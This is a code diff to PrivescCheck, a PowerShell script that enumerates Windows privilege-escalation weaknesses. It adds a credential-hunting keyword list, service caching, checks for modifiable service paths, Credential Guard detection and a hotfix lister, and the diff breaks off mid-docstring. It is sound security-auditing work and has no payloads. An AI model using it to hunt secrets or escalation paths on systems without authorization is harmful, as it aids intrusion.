@@ -19,6 +19,18 @@
 #Requires -Version 2
 
 # ----------------------------------------------------------------
+# BEGIN Global variables
+# ----------------------------------------------------------------
+$global:ScriptPath = $MyInvocation.MyCommand.Definition
+$global:CachedServiceList = New-Object -TypeName System.Collections.ArrayList
+$global:CachedHotFixList = New-Object -TypeName System.Collections.ArrayList
+$global:ResultArrayList = New-Object -TypeName System.Collections.ArrayList
+[string[]] $global:KeywordsOfInterest = "key", "passw", "secret", "pwd", "creds", "credential", "api"
+# ----------------------------------------------------------------
+# END Global variables
+# ----------------------------------------------------------------
+
+# ----------------------------------------------------------------
 # Win32 stuff  
 # ----------------------------------------------------------------
 #region Win32
@@ -365,14 +377,48 @@ try {
 }
 #endregion Win32
 
-
 # ----------------------------------------------------------------
 # Helpers 
 # ----------------------------------------------------------------
 #region Helpers 
-$global:IgnoredPrograms = @("Common Files", "Internet Explorer", "ModifiableWindowsApps", "PackageManagement", "Windows Defender", "Windows Defender Advanced Threat Protection", "Windows Mail", "Windows Media Player", "Windows Multimedia Platform", "Windows NT", "Windows Photo Viewer", "Windows Portable Devices", "Windows Security", "WindowsPowerShell", "Microsoft.NET", "Windows Portable Devices", "dotnet", "MSBuild", "Intel", "Reference Assemblies")
 
-$global:IgnoredServices = @("1394ohci", "3ware", "AarSvc", "ACPI", "AcpiDev", "acpiex", "acpipagr", "AcpiPmi", "acpitime", "Acx01000", "ADOVMPPackage", "ADP80XX", "adsi", "ADWS", "AeLookupSvc", "AFD", "afunix", "ahcache", "AJRouter", "ALG", "AllUserInstallAgent", "amdgpio2", "amdi2c", "AmdK8", "AmdPPM", "amdsata", "amdsbs", "amdxata", "AppID", "AppIDSvc", "Appinfo", "applockerfltr", "AppMgmt", "AppReadiness", "AppHostSvc", "AppVClient", "AppvStrm", "AppvVemgr", "AppvVfs", "AppXSvc", "arcsas", "aspnet_state", "AssignedAccessManagerSvc", "AsyncMac", "atapi", "AudioEndpointBuilder", "Audiosrv", "autotimesvc", "AxInstSV", "b06bdrv", "bam", "BasicDisplay", "BasicRender", "BattC", "BcastDVRUserService", "bcmfn2", "BDESVC", "Beep", "BFE", "bindflt", "BITS", "BluetoothUserService", "bowser", "BrokerInfrastructure", "Browser", "BTAGService", "BthA2dp", "BthAvctpSvc", "BthEnum", "BthHFEnum", "BthLEEnum", "BthMini", "BTHMODEM", "BthPan", "BTHPORT", "bthserv", "BTHUSB", "bttflt", "buttonconverter", "CAD", "camsvc", "CaptureService", "cbdhsvc", "cdfs", "CDPSvc", "CDPUserSvc", "cdrom", "CertPropSvc", "cht4iscsi", "cht4vbd", "CimFS", "circlass", "CldFlt", "CLFS", "ClipSVC", "CmBatt", "CNG", "cnghwassist", "CompositeBus", "COMSysApp", "condrv", "ConsentUxUserSvc", "CoreMessagingRegistrar", "CoreUI", "CredentialEnrollmentManagerUserSvc", "crypt32", "CryptSvc", "CSC", "CscService", "dam", "DCLocator", "DcomLaunch", "defragsvc", "DeviceAssociationBrokerSvc", "DeviceAssociationService", "DeviceInstall", "DevicePickerUserSvc", "DevicesFlowUserSvc", "DevQueryBroker", "Dfs", "Dfsc", "DFSR", "Dhcp", "diagnosticshub.standardcollector.service", "diagsvc", "DiagTrack", "disk", "DispBrokerDesktopSvc", "DisplayEnhancementService", "DmEnrollmentSvc", "dmvsc", "dmwappushservice", "DNS", "Dnscache", "DoSvc", "dot3svc", "DPS", "drmkaud", "DsmSvc", "DsRoleSvc", "DsSvc", "DusmSvc", "DXGKrnl", "e1i65x64", "Eaphost", "ebdrv", "EFS", "ehRecvr", "ehSched", "EhStorClass", "EhStorTcgDrv", "embeddedmode", "EntAppSvc", "ErrDev", "ESENT", "EventLog", "EventSystem", "exfat", "fastfat", "Fax", "fdc", "fdPHost", "FDResPub", "fhsvc", "FileCrypt", "FileInfo", "Filetrace", "flpydisk", "FltMgr", "FontCache", "FrameServer", "FsDepends", "Fs_Rec", "fvevol", "gencounter", "genericusbfn", "GPIOClx0101", "gpsvc", "GpuEnergyDrv", "GraphicsPerfSvc", "HdAudAddService", "HDAudBus", "HidBatt", "HidBth", "hidi2c", "hidinterrupt", "HidIr", "hidserv", "hidspi", "HidUsb", "hkmsvc", "HomeGroupListener", "HomeGroupProvider", "HpSAMD", "HTTP", "hvcrash", "HvHost", "hvservice", "HwNClx0101", "hwpolicy", "hyperkbd", "HyperVideo", "i8042prt", "iagpio", "iai2c", "iaStorAV", "iaStorAVC", "iaStorV", "ibbus", "icssvc", "idsvc", "IEEtwCollectorService", "IKEEXT", "IndirectKmd", "inetaccs", "InstallService", "intelide", "intelpep", "intelpmax", "intelppm", "iorate", "IPBusEnum", "IpFilterDriver", "iphlpsvc", "IPMIDRV", "IPNAT", "IPT", "IpxlatCfgSvc", "isapnp", "iScsiPrt", "IsmServ", "ItSas35i", "kbdclass", "kbdhid", "Kdc", "KdsSvc", "kdnic", "KeyIso", "KPSSVC", "KSecDD", "KSecPkg", "ksthunk", "KtmRm", "LanmanServer", "LanmanWorkstation", "ldap", "lfsvc", "LicenseManager", "lltdio", "lltdsvc", "lmhosts", "Lsa", "LSI_SAS", "LSI_SAS2i", "LSI_SAS3i", "LSI_SSS", "LSM", "luafv", "LxpSvc", "MapsBroker", "mausbhost", "mausbip", "MbbCx", "Mcx2Svc", "megasas", "megasas2i", "megasas35i", "megasr", "MessagingService", "Microsoft_Bluetooth_AvrcpTransport", "MixedRealityOpenXRSvc", "mlx4_bus", "MMCSS", "Modem", "monitor", "mouclass", "mouhid", "mountmgr", "mpsdrv", "mpssvc", "MRxDAV", "mrxsmb", "mrxsmb20", "MsBridge", "Msfs", "msgpiowin32", "mshidkmdf", "mshidumdf", "msisadrv", "MSiSCSI", "msiserver", "MSKSSRV", "MsLldp", "MSPCLOCK", "MSPQM", "MsQuic", "MsRPC", "MSSCNTRS", "MsSecFlt", "mssmbios", "MSTEE", "MTConfig", "Mup", "mvumis", "napagent", "NativeWifiP", "NaturalAuthentication", "NcaSvc", "NcbService", "NcdAutoSetup", "ndfltr", "NDIS", "NdisCap", "NdisImPlatform", "NdisTapi", "Ndisuio", "NdisVirtualBus", "NdisWan", "ndiswanlegacy", "NDKPing", "ndproxy", "Ndu", "NetAdapterCx", "NetBIOS", "NetbiosSmb", "NetBT", "NetMsmqActivator", "NetPipeActivator", "NetTcpActivator", "Netlogon", "Netman", "netprofm", "NetSetupSvc", "NetTcpPortSharing", "netvsc", "NgcCtnrSvc", "NgcSvc", "NlaSvc", "Npfs", "npsvctrig", "nsi", "nsiproxy", "NTDS", "Ntfs", "NtFrs", "Null", "nvdimm", "nvraid", "nvstor", "OneSyncSvc", "p2pimsvc", "p2psvc", "Parport", "partmgr", "PcaSvc", "pci", "pciide", "pcmcia", "pcw", "pdc", "PEAUTH", "PeerDistSvc", "PenService", "perceptionsimulation", "percsas2i", "percsas3i", "PerfDisk", "PerfHost", "PerfNet", "PerfOS", "PerfProc", "PhoneSvc", "PimIndexMaintenanceSvc", "PktMon", "pla", "PlugPlay", "pmem", "PNPMEM", "PNRPAutoReg", "PNRPsvc", "PolicyAgent", "portcfg", "PortProxy", "Power", "PptpMiniport", "PrintNotify", "PrintWorkflowUserSvc", "Processor", "ProfSvc", "ProtectedStorage", "Psched", "PushToInstall", "pvscsi", "QWAVE", "QWAVEdrv", "Ramdisk", "RasAcd", "RasAgileVpn", "RasAuto", "Rasl2tp", "RasMan", "RasPppoe", "RasSstp", "rdbss", "RDMANDK", "rdpbus", "RDPDR", "RDPNP", "RDPUDD", "RdpVideoMiniport", "rdyboost", "ReFS", "ReFSv1", "FCRegSvc", "RemoteAccess", "RemoteRegistry", "RetailDemo", "RFCOMM", "rhproxy", "RmSvc", "RpcEptMapper", "RpcLocator", "RpcSs", "RSoPProv", "rspndr", "s3cap", "sacsvr", "SamSs", "sbp2port", "SCardSvr", "ScDeviceEnum", "scfilter", "Schedule", "scmbus", "SCPolicySvc", "sdbus", "SDFRd", "SDRSVC", "sdstor", "seclogon", "SecurityHealthService", "SEMgrSvc", "SENS", "Sense", "SensorDataService", "SensorService", "SensrSvc", "SerCx", "SerCx2", "Serenum", "Serial", "sermouse", "SessionEnv", "sfloppy", "SgrmAgent", "SgrmBroker", "SharedAccess", "SharedRealitySvc", "ShellHWDetection", "shpamsvc", "SiSRaid2", "SiSRaid4", "SmartSAMD", "smbdirect", "smphost", "SmsRouter", "SMSvcHost 4.0.0.0", "SNMPTRAP", "spaceparser", "spaceport", "SpatialGraphFilter", "SpbCx", "spectrum", "Spooler", "sppsvc", "sppuinotify", "srv2", "srvnet", "SSDPSRV", "ssh-agent", "SstpSvc", "StateRepository", "stexstor", "stisvc", "storahci", "storflt", "stornvme", "storqosflt", "StorSvc", "storufs", "storvsc", "svsvc", "swenum", "swprv", "Synth3dVsc", "SysMain", "SystemEventsBroker", "TabletInputService", "TapiSrv", "Tcpip", "Tcpip6", "TCPIP6TUNNEL", "tcpipreg", "TCPIPTUNNEL", "tdx", "Telemetry", "terminpt", "TermService", "Themes", "TieringEngineService", "TimeBroker", "TimeBrokerSvc", "THREADORDER", "TokenBroker", "TPM", "TrkWks", "TroubleshootingSvc", "TrustedInstaller", "TSDDD", "TsUsbFlt", "TsUsbGD", "tsusbhub", "tunnel", "tzautoupdate", "UALSVC", "UASPStor", "UcmCx0101", "UcmTcpciCx0101", "UcmUcsiAcpiClient", "UcmUcsiCx0101", "Ucx01000", "UdeCx", "udfs", "UdkUserSvc", "UEFI", "UevAgentDriver", "UevAgentService", "Ufx01000", "UfxChipidea", "ufxsynopsys", "UGatherer", "UGTHRSVC", "UI0Detect", "umbus", "UmPass", "UmRdpService", "UnistoreSvc", "upnphost", "UrsChipidea", "UrsCx01000", "UrsSynopsys", "usbaudio", "usbaudio2", "usbccgp", "usbcir", "usbehci", "usbhub", "USBHUB3", "usbohci", "usbprint", "usbser", "USBSTOR", "usbuhci", "USBXHCI", "UserDataSvc", "UserManager", "UsoSvc", "UxSms", "VacSvc", "VaultSvc", "vdrvroot", "vds", "VerifierExt", "VGAuthService", "vhdmp", "vhf", "Vid", "VirtualRender", "vm3dmp", "vm3dmp-debug", "vm3dmp-stats", "vm3dmp_loader", "vmbus", "VMBusHID", "vmci", "vmgid", "vmhgfs", "vmicguestinterface", "vmicheartbeat", "vmickvpexchange", "vmicrdv", "vmicshutdown", "vmictimesync", "vmicvmsession", "vmicvss", "VMMemCtl", "vmmouse", "vmrawdsk", "vmusbmouse", "vmvss", "vmwefifw", "vmxnet3ndis6", "volmgr", "volmgrx", "volsnap", "volume", "vpci", "vsmraid", "vsock", "VSS", "VSTXRAID", "vwifibus", "vwififlt", "W32Time", "w3logsvc", "W3SVC", "WaaSMedicSvc", "WAS", "WacomPen", "WalletService", "wanarp", "wanarpv6", "WarpJITSvc", "WatAdminSvc", "wbengine", "WbioSrvc", "wcifs", "Wcmsvc", "wcncsvc", "wcnfs", "WcsPlugInService", "WdBoot", "Wdf01000", "WdFilter", "WdiServiceHost", "WdiSystemHost", "wdiwifi", "WdmCompanionFilter", "WdNisDrv", "WdNisSvc", "WebClient", "Wecsvc", "WEPHOSTSVC", "wercplsupport", "WerSvc", "WFDSConMgrSvc", "WFPLWFS", "WiaRpc", "WIMMount", "WinDefend", "Windows Workflow Foundation 4.0.0.0", "WindowsTrustedRT", "WindowsTrustedRTProxy", "WinHttpAutoProxySvc", "WinMad", "Winmgmt", "WinNat", "WinRM", "Winsock", "WinSock2", "WINUSB", "WinVerbs", "wisvc", "WlanSvc", "wlidsvc", "WLMS", "wlpasvc", "WManSvc", "WmiAcpi", "WmiApRpl", "wmiApSrv", "WMPNetworkSvc", "Wof", "workerdd", "workfolderssvc", "WpcMonSvc", "WPCSvc", "WPDBusEnum", "WpdUpFltr", "WpnService", "WpnUserService", "ws2ifsl", "wscsvc", "WSearch", "WSearchIdxPi", "WSService", "wuauserv", "WudfPf", "WUDFRd", "wudfsvc", "WwanSvc", "XblAuthManager", "XblGameSave", "xboxgip", "XboxGipSvc", "XboxNetApiSvc", "xinputhid", "xmlprov")
+function Convert-SidToName {
+    <#
+    .SYNOPSIS
+
+    Helper - Converts a SID string to its corresponding username
+
+    Author: @itm4n
+    License: BSD 3-Clause
+    
+    .DESCRIPTION
+
+    This helper function takes a user SID as an input parameter and returns the account name 
+    associated to this SID. If an account name cannot be found, nothing is returned.
+    
+    .PARAMETER Sid
+
+    A user account SID, e.g.: S-1-5-18.
+    
+    .EXAMPLE
+    An example
+    PS C:\> Convert-SidToName -Sid S-1-5-18"
+
+    NT AUTHORITY\SYSTEM
+    
+    #>
+
+    [CmdletBinding()] param(
+        [string]$Sid
+    )
+
+    try {
+        $SidObj = New-Object System.Security.Principal.SecurityIdentifier($Sid)
+        $SidObj.Translate([System.Security.Principal.NTAccount]) | Select-Object -ExpandProperty Value
+    } catch {
+        # Do nothing
+    }
+}
 
 function Convert-DateToString {
     <#
@@ -507,50 +553,42 @@ function Convert-ServiceStartModeToString {
 }
 
 function Test-IsKnownService {
-    <#
-    .SYNOPSIS
 
-    Helper - Compares a service name against a list of known service name patterns
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    In Windows 10, a lot of services were added. Although they are the same, their name will vary 
-    from an installation to another. The pattern of their name is "service_XXXXXXXX" where 
-    "XXXXXXXX" is random hexadecimal string which is "unique" to an installation of Windows. The
-    aim of this function is to determine whether a given service name matches this pattern.
-    
-    .PARAMETER ServiceName
-
-    The name of a service as a String
-    
-    .EXAMPLE
-
-    PS C:\> Test-IsKnownService -ServiceName 'CaptureService_1fe3b73d'
-    
-    True
-    
-    #>
-    
     [CmdletBinding()] param(
-        [string]
-        $ServiceName
+        [object]$Service
     )
 
-    $KnownServices = @("AarSvc_*", "BcastDVRUserService_*", "BluetoothUserService_*", "CaptureService_*", "cbdhsvc_*", "CDPUserSvc_*", "clr_optimization_*", "ConsentUxUserSvc_*", "CredentialEnrollmentManagerUserSvc_*", "DeviceAssociationBrokerSvc_*", "DevicePickerUserSvc_*", "DevicesFlowUserSvc_*", "FontCache*", "iaLPSS*", "IpOverUsbSvc", "LxssManager*", "MessagingService_*", "MSDTC*", ".NET*", "OneSyncSvc_*", "PenService_*", "PimIndexMaintenanceSvc_*", "PrintWorkflowUserSvc_*", "UdkUserSvc_*", "UnistoreSvc_*", "UserDataSvc_*", "WpnUserService_*")
+    if ($Service) {
 
-    if ($global:IgnoredServices -contains $ServiceName) {
-        return $True 
-    } else {
-        ForEach ($KnownService in $KnownServices) {
-            if ($ServiceName -like $KnownService) {
-                return $True 
+        $ImagePath = $Service.ImagePath        
+
+        $SeparationCharacterSets = @('"', "'", ' ', "`"'", '" ', "' ", "`"' ")
+
+        ForEach($SeparationCharacterSet in $SeparationCharacterSets) {
+
+            $CandidatePaths = $ImagePath.Split($SeparationCharacterSet) | Where-Object {$_ -and ($_.trim() -ne '')}
+
+            ForEach($CandidatePath in $CandidatePaths) {
+
+                $TempPath = $([System.Environment]::ExpandEnvironmentVariables($CandidatePath))
+                $TempPathResolved = Resolve-Path -Path $TempPath -ErrorAction SilentlyContinue -ErrorVariable ErrorResolvePath 
+                if (-not $ErrorResolvePath) {
+
+                    $File = Get-Item -Path $TempPathResolved -ErrorAction SilentlyContinue -ErrorVariable ErrorGetItem 
+                    if (-not $ErrorGetItem) {
+
+                        if ($File.VersionInfo.LegalCopyright -Like "*Microsoft Corporation*") {
+                            return $True 
+                        } else {
+                            return $False
+                        }
+                    }
+                }
             }
         }
     }
-    return $False 
+
+    return $False
 }
 
 function Get-UserPrivileges {
@@ -669,9 +707,6 @@ function Get-UserPrivileges {
 
                 # Convert the unmanaged memory at offset $TokenPrivilegesPtr to a TOKEN_PRIVILEGES managed type 
                 $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesPtr, [type] [PrivescCheck.Win32+TOKEN_PRIVILEGES])
-                #$Offset = [System.IntPtr]::Add($TokenPrivilegesPtr, 4)
-                # Properly Incrementing an IntPtr
-                # https://docs.microsoft.com/en-us/archive/blogs/jaredpar/properly-incrementing-an-intptr
                 $Offset = [IntPtr] ($TokenPrivilegesPtr.ToInt64() + 4)
                 
                 Write-Verbose "GetTokenInformation() OK - Privilege count: $($TokenPrivileges.PrivilegeCount)"
@@ -686,7 +721,6 @@ function Get-UserPrivileges {
                     [IntPtr]$LuidPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($LuidSize)
                     [System.Runtime.InteropServices.Marshal]::StructureToPtr($LuidAndAttributes.Luid, $LuidPtr, $True)
 
-                    # public static extern bool LookupPrivilegeName(string lpSystemName, IntPtr lpLuid, System.Text.StringBuilder lpName, ref int cchName );
                     [int]$Length = 0
                     $Success = [PrivescCheck.Win32]::LookupPrivilegeName($Null, $LuidPtr, $Null, [ref]$Length)
                     $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
@@ -727,9 +761,6 @@ function Get-UserPrivileges {
                     [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LuidPtr)
 
                     # Update the offset to point to the next LUID_AND_ATTRIBUTES structure in the unmanaged buffer
-                    #$Offset = [System.IntPtr]::Add($Offset, [System.Runtime.InteropServices.Marshal]::SizeOf($LuidAndAttributes))
-                    # Properly Incrementing an IntPtr
-                    # https://docs.microsoft.com/en-us/archive/blogs/jaredpar/properly-incrementing-an-intptr
                     $Offset = [IntPtr] ($Offset.ToInt64() + [System.Runtime.InteropServices.Marshal]::SizeOf($LuidAndAttributes))
                 }
 
@@ -1125,6 +1156,8 @@ function Get-InstalledPrograms {
         $Filtered = $False
     )
 
+    $IgnoredPrograms = @("Common Files", "Internet Explorer", "ModifiableWindowsApps", "PackageManagement", "Windows Defender", "Windows Defender Advanced Threat Protection", "Windows Mail", "Windows Media Player", "Windows Multimedia Platform", "Windows NT", "Windows Photo Viewer", "Windows Portable Devices", "Windows Security", "WindowsPowerShell", "Microsoft.NET", "Windows Portable Devices", "dotnet", "MSBuild", "Intel", "Reference Assemblies")
+
     $InstalledProgramsResult = New-Object System.Collections.ArrayList
 
     $InstalledPrograms = New-Object System.Collections.ArrayList
@@ -1170,7 +1203,7 @@ function Get-InstalledPrograms {
     if ($Filtered) {
         $InstalledProgramsResultFiltered = New-Object -TypeName System.Collections.ArrayList
         ForEach ($InstalledProgram in $InstalledProgramsResult) {
-            if (-Not ($global:IgnoredPrograms -contains $InstalledProgram.Name)) {
+            if (-Not ($IgnoredPrograms -contains $InstalledProgram.Name)) {
                 [void]$InstalledProgramsResultFiltered.Add($InstalledProgram)
             }
         }
@@ -1265,28 +1298,39 @@ function Get-ServiceList {
         $FilterLevel
     )
 
-    $ServicesRegPath = "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services" 
-    $RegAllServices = Get-ChildItem -Path $ServicesRegPath
+    if ($CachedServiceList.Count -eq 0) {
 
-    ForEach ($RegService in $RegAllServices) {
+        # If the cached service list hasn't been initialized yet, enumerate all services and 
+        # populate the cache.
 
-        $Properties = Get-ItemProperty -Path $RegService.PSPath -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError
-        if ($GetItemPropertyError) {
-            # If an error occurred, skip the current item 
-            continue 
-        } 
+        $ServicesRegPath = "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services" 
+        $RegAllServices = Get-ChildItem -Path $ServicesRegPath -ErrorAction SilentlyContinue
 
-        $DisplayName = [System.Environment]::ExpandEnvironmentVariables($Properties.DisplayName)
+        ForEach ($RegService in $RegAllServices) {
 
-        $ServiceItem = New-Object -TypeName PSObject 
-        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $Properties.PSChildName
-        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "DisplayName" -Value $DisplayName
-        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "User" -Value $Properties.ObjectName 
-        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "ImagePath" -Value $Properties.ImagePath 
-        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "StartMode" -Value $(Convert-ServiceStartModeToString -StartMode $Properties.Start)
-        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Type" -Value $(Convert-ServiceTypeToString -ServiceType $Properties.Type)
-        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "RegistryKey" -Value $RegService.Name
-        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "RegistryPath" -Value $RegService.PSPath 
+            $Properties = Get-ItemProperty -Path $RegService.PSPath -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError
+            if ($GetItemPropertyError) {
+                # If an error occurred, skip the current item 
+                continue 
+            }
+
+            $DisplayName = [System.Environment]::ExpandEnvironmentVariables($Properties.DisplayName)
+
+            $ServiceItem = New-Object -TypeName PSObject 
+            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $Properties.PSChildName
+            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "DisplayName" -Value $DisplayName
+            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "User" -Value $Properties.ObjectName 
+            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "ImagePath" -Value $Properties.ImagePath 
+            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "StartMode" -Value $(Convert-ServiceStartModeToString -StartMode $Properties.Start)
+            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Type" -Value $(Convert-ServiceTypeToString -ServiceType $Properties.Type)
+            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "RegistryKey" -Value $RegService.Name
+            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "RegistryPath" -Value $RegService.PSPath 
+
+            [void] $CachedServiceList.Add($ServiceItem)
+        }
+    }
+
+    ForEach ($ServiceItem in $CachedServiceList) {
 
         # FilterLevel = 0 - Add the service to the list and go to the next one 
         if ($FilterLevel -eq 0) {
@@ -1294,21 +1338,24 @@ function Get-ServiceList {
             continue 
         }
 
-        if ($Properties.ImagePath -and (-not ($Properties.ImagePath.trim() -eq ''))) {
+        if ($ServiceItem.ImagePath -and (-not ($ServiceItem.ImagePath.trim() -eq ''))) {
+
             # FilterLevel = 1 - Add the service to the list of its ImagePath is not empty
             if ($FilterLevel -le 1) {
                 $ServiceItem
                 continue 
             }
 
-            if ($Properties.Type -gt 8) {
+            if (@("Win32OwnProcess", "Win32ShareProcess", "InteractiveProcess") -contains $ServiceItem.Type) {
+
                 # FilterLevel = 2 - Add the service to the list if it's not a driver 
                 if ($FilterLevel -le 2) {
                     $ServiceItem
                     continue
                 }
 
-                if (-not (Test-IsKnownService -ServiceName $Properties.PSChildName)) {
+                if (-not (Test-IsKnownService -Service $ServiceItem)) {
+
                     # FilterLevel = 3 - Add the service if it's not a built-in Windows service 
                     if ($FilterLevel -le 3) {
                         $ServiceItem
@@ -1316,7 +1363,7 @@ function Get-ServiceList {
                     }
                 }
             }
-        } 
+        }
     }
 }
 
@@ -1383,8 +1430,6 @@ function Get-ModifiablePath {
     )
 
     BEGIN {
-        # # false positives ?
-        # $Excludes = @("MsMpEng.exe", "NisSrv.exe")
 
         # from http://stackoverflow.com/questions/28029872/retrieving-security-descriptor-and-getting-number-for-filesystemrights
         $AccessMask = @{
@@ -1447,41 +1492,45 @@ function Get-ModifiablePath {
                 }
             }
             else {
+                $TargetPath = $([System.Environment]::ExpandEnvironmentVariables($TargetPath)).Trim()
+                
                 ForEach($SeparationCharacterSet in $SeparationCharacterSets) {
                     $TargetPath.Split($SeparationCharacterSet) | Where-Object {$_ -and ($_.trim() -ne '')} | ForEach-Object {
 
-                        if(($SeparationCharacterSet -notmatch ' ')) {
+                        if (-not ($_ -match "^[A-Z]:`$")) {
 
-                            $TempPath = $([System.Environment]::ExpandEnvironmentVariables($_)).Trim()
+                            if($SeparationCharacterSet -notmatch ' ') {
 
-                            # if the path is actually an option like '/svc', skip it 
-                            # it will prevent a lot of false positives but it might also skip vulnerable paths in some particular cases 
-                            # though, it's more common to see options like '/svc' than file paths like '/ProgramData/something' in Windows 
-                            if (-not ($TempPath -Like "/*")) { 
-
-                                if($TempPath -and ($TempPath -ne '')) {
-                                    if(Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
-                                        # if the path exists, resolve it and add it to the candidate list
-                                        $CandidatePaths += Resolve-Path -Path $TempPath | Select-Object -ExpandProperty Path
-                                    }
-                                    else {
-                                        # if the path doesn't exist, check if the parent folder allows for modification
-                                        try {
-                                            $ParentPath = (Split-Path -Path $TempPath -Parent -ErrorAction SilentlyContinue).Trim()
-                                            if($ParentPath -and ($ParentPath -ne '') -and (Test-Path -Path $ParentPath -ErrorAction SilentlyContinue)) {
-                                                $CandidatePaths += Resolve-Path -Path $ParentPath | Select-Object -ExpandProperty Path
+                                $TempPath = $([System.Environment]::ExpandEnvironmentVariables($_)).Trim()
+    
+                                # if the path is actually an option like '/svc', skip it 
+                                # it will prevent a lot of false positives but it might also skip vulnerable paths in some particular cases 
+                                # though, it's more common to see options like '/svc' than file paths like '/ProgramData/something' in Windows 
+                                if ((-not ($TempPath -Like "/*")) -and (-not ($TempPath -match "^[A-Z]:`$"))) { 
+    
+                                    if($TempPath -and ($TempPath -ne '')) {
+                                        if (Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
+                                            # if the path exists, resolve it and add it to the candidate list
+                                            $CandidatePaths += Resolve-Path -Path $TempPath | Select-Object -ExpandProperty Path
+                                        } else {
+                                            # if the path doesn't exist, check if the parent folder allows for modification
+                                            try {
+                                                $ParentPath = (Split-Path -Path $TempPath -Parent -ErrorAction SilentlyContinue).Trim()
+                                                if ($ParentPath -and ($ParentPath -ne '') -and (Test-Path -Path $ParentPath -ErrorAction SilentlyContinue)) {
+                                                    $CandidatePaths += Resolve-Path -Path $ParentPath | Select-Object -ExpandProperty Path
+                                                }
+                                            } catch {
+                                                # trap because Split-Path doesn't handle -ErrorAction SilentlyContinue nicely
                                             }
-                                        }
-                                        catch {
-                                            # trap because Split-Path doesn't handle -ErrorAction SilentlyContinue nicely
                                         }
                                     }
                                 }
+                            } else {
+                                # if the separator contains a space
+                                $CandidatePaths += Resolve-Path -Path $([System.Environment]::ExpandEnvironmentVariables($_)) -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path | ForEach-Object {$_.Trim()} | Where-Object {($_ -ne '') -and (Test-Path -Path $_)}
                             }
-                        }
-                        else {
-                            # if the separator contains a space
-                            $CandidatePaths += Resolve-Path -Path $([System.Environment]::ExpandEnvironmentVariables($_)) -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path | ForEach-Object {$_.Trim()} | Where-Object {($_ -ne '') -and (Test-Path -Path $_)}
+                        } else {
+                            Write-Verbose "DEBUG: Got a drive letter as a path: $_"
                         }
                     }
                 }
@@ -1651,7 +1700,7 @@ function Add-ServiceDacl {
     <#
     .SYNOPSIS
 
-    Adds a Dacl field to a service object returned by Get-Service.
+    Helper - Adds a Dacl field to a service object returned by Get-Service.
 
     Author: Matthew Graeber (@mattifestation)
     License: BSD 3-Clause
@@ -1942,28 +1991,19 @@ function Get-CredentialGuardStatus {
     $OsVersion = [System.Environment]::OSVersion.Version
 
     if ($OsVersion.Major -ge 10) {
+        
+        if (((Get-ComputerInfo).DeviceGuardSecurityServicesConfigured) -match 'CredentialGuard') {
 
-        $RegPath = "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\LSA"
-        $Result = Get-ItemProperty -Path "Registry::$($RegPath)" -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError 
-    
-        if (-not $GetItemPropertyError) {
-    
-            if (-not ($Null -eq $Result.LsaCfgFlags)) {
-    
-                if ($Result.LsaCfgFlags -eq 0) {
-                    $Status = $False 
-                    $Description = "Credential Guard is disabled"
-                } elseif ($Result.LsaCfgFlags -eq 1) {
-                    $Status = $True 
-                    $Description = "Credential Guard is enabled with UEFI lock"
-                } elseif ($Result.LsaCfgFlags -eq 2) {
-                    $Status = $True
-                    $Description = "Credential Guard is enabled without UEFI lock"
-                } 
-            } else {
-                $Status = $False 
-                $Description = "Credential Guard is not configured"
+            $Status = $False
+            $Description = "Credential Guard is configured but is not running"
+
+            if (((Get-ComputerInfo).DeviceGuardSecurityServicesRunning) -match 'CredentialGuard') {
+                $Status = $True
+                $Description = "Credential Guard is configured and running"
             }
+        } else {
+            $Status = $False
+            $Description = "Credential Guard is not configured"
         }
     } else {
         $Status = $False
@@ -2190,6 +2230,155 @@ function Get-UnattendSensitiveData {
         }
     }
 }
+
+function Get-HotFixList {
+    <#
+    .SYNOPSIS
+
+    Helper - Gets a list of installed updates and hotfixes.
+    
+    .DESCRIPTION
+
+    This check reads the registry in order to enumerate all the installed KB hotfixes. The output
+    is sorted by date so that most recent patches appear first in the list. The output is similar
+    to the output of the built-in 'Get-HotFix' powershell command. There is a major difference
+    between this script and the 'Get-HotFix' command though. The latter relies on WMI to delegate
+    the "enumeration" whereas this script directly parses the registry. The other benefit of this 
+    method is that it allows one to extract more information related to the KBs (although it's not
+    in the output of this script). If the current user can't read the registry, the script falls
+    back to the built-in 'Get-HotFix' cmdlet.
+    
+    .EXAMPLE
+
+    PS C:\> Get-HotFixList
+
+    HotFixID  Description     InstalledBy           InstalledOn
+    --------  -----------     -----------           -----------
+    KB4557968 Security Update                       2020-05-11 07:37:09
+    KB4560366 Security Update DESKTOP-7A0AKQI\admin 2020-06-22 12:40:39
+    KB4566785 Security Update NT AUTHORITY\SYSTEM   2020-07-16 13:08:14
+    KB4570334 Security Update NT AUTHORITY\SYSTEM   2020-08-13 17:45:34
+    KB4577266 Security Update NT AUTHORITY\SYSTEM   2020-09-11 13:37:59
+    KB4537759 Security Update                       2020-05-11 07:44:14
